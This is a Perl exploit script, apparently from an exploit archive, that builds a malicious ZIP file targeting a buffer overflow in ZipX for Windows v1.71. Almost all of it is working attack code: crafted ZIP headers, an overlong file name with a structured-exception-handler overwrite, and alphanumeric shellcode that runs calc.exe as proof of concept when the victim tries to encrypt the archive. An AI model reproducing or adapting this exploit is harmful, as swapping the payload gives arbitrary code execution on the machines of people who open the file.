#!/usr/bin/perl
#
#[+]Exploit Title: ZipX for Windows v1.71 ZIP File Buffer Overflow Exploit
#[+]Date: 05\09\2011
#[+]Author: C4SS!0 G0M3S
#[+]Software Link: http://download.cnet.com/ZipX/3000-2250_4-10518937.html
#[+]Version: v1.71
#[+]Tested On: WIN-XP SP3 Brazilian Portuguese
#[+]CVE: N/A
#
#
#Reproduce:
#Open the zip file, after click in "Encrypt", type you password and click in "Ok" BOOM!!! 
#See the calc.exe
#


use strict;
use warnings;

my $filename = "Exploit.zip"; 

print "\n\n\t\tZipX for Windows v1.71 ZIP File Buffer Overflow Exploit\n";
print "\t\tCreated by C4SS!0 G0M3S\n";
print "\t\tE-mail louredo_\@hotmail.com\n";
print "\t\tSite http://net-fuzzer.blogspot.com/\n\n";
sleep(1);

print "\t\t[+]Creating ZIP File...\n";
sleep(1);
my $head = "\x50\x4B\x03\x04\x14\x00\x00".
"\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" .
"\x00\x00\x00\x00\x00\x00\x00\x00" .
"\xe4\x0f" .
"\x00\x00\x00";

my $head2 = "\x50\x4B\x01\x02\x14\x00\x14".
"\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" .
"\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\xe4\x0f".
"\x00\x00\x00\x00\x00\x00\x01\x00".
"\x24\x00\x00\x00\x00\x00\x00\x00";

my $head3 = "\x50\x4B\x05\x06\x00\x00\x00".
"\x00\x01\x00\x01\x00".
"\x12\x10\x00\x00".
"\x02\x10\x00\x00".
"\x00\x00";

my $shellcode = 
"PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIHZXL9ID414ZTOKHI9LMUK" .
"VPZ6QO9X1P26QPZTW5S1JR7LCTKN8BGR3RWS9JNYLK79ZZ165U2KKLC5RZGNNUC70NEPB9OUTQMXPNMM" .
"PV261UKL71ME2NMP7FQY0NOHKPKZUDOZULDS8PQ02ZXM3TCZK47PQODJ8O52JNU0N72N28MZKLTNGU7Z" . # Shellcode WinExec "calc.exe"
"UXDDXZSOMKL4SQKUNKMJPOOCRODCMDKR0PGQD0EYIRVMHUZJDOGTUV2WP3OIVQ1QJSLSKGBLYKOY7NWW" . # Alpha Numeric Shellcode BaseAddress EAX
"LNG6LBOM5V6M0KF2NQDPMSL7XT80P61PBMTXYQDK5DMLYT231V649DZTPP26LWSQRLZLQK15XUXYUNP1" .
"BPF4X6PZIVOTZPJJRUOCC3KD9L034LDOXX5KKXNJQMOLSJ6BCORL9WXQNKPUWNKRKJ8JSNS4YMMOHT3Z" .
"QJOHQ4QJUQLN1VSLV5S1QYO0YA";
my $payload = "A" x 330;
$payload .= 
("\x66\x05\x4D\xCD" x 4).
"\x66\x05\x19\x18". # ADD AX,1819
"\x54\x5A\x50\x5B". # PUSH ESP # POP EDX # PUSH EAX # POP EBX
"\x2B\xE0". # Afer convertion SUB EDX,EBX
"\x52\x58". # PUSH EDX # POP EAX
"\x98\xd1"; # CALL EAX
$payload .= "C" x (371-length($payload));
$payload .= "\x3C\x01\x75\xd1"; # Converted is that "\x3c\x04\x75\xd0"
$payload .= pack('V',0x0041334d); # P/P/RET
$payload .= $shellcode;
$payload .= "B" x (4064-length($payload));
$payload = $payload.".rar";
my $zip = $head.$payload.$head2.$payload.$head3;
open(FILE,">$filename") || die "\t\t[-]Error:\n$!\n";
print FILE $zip;
close(FILE);
print "\t\t[+] ZIP File Created With Sucess:)\n";
sleep(3);

